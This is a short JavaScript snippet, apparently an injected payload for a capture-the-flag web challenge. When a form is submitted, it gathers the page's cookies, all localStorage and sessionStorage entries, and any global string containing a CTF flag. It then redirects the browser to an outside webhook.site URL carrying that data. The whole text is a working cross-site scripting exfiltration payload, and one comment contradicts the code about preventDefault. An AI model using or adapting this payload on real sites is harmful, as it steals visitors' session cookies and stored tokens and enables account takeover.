document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form");
  if (!form) return;

  form.addEventListener("submit", e => {
      e.preventDefault();
    // Extract the flag BEFORE navigation
      setTimeout(() => {
        let data = {};
        data.cookie = document.cookie;

        try {
           data.localStorage = Object.entries(localStorage).map(([k,v]) => `${k}=${v}`).join('; ');
        } catch {}

        try {
            data.sessionStorage = Object.entries(sessionStorage).map(([k,v]) => `${k}=${v}`).join('; ');
        } catch {}

        try {
            for (let key in window) {
                if (
                    typeof window[key] === 'string' &&
                    window[key].includes('CTF{')
                ) {
                    data.windowFlag = window[key];
                   break;
                }
             }
          }  catch {}

          const encoded = encodeURIComponent(JSON.stringify(data));
          window.location = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + encoded;

      }, 1500);
    // Let the form submission proceed
    // (no preventDefault, so navigation will happen)
  });
});


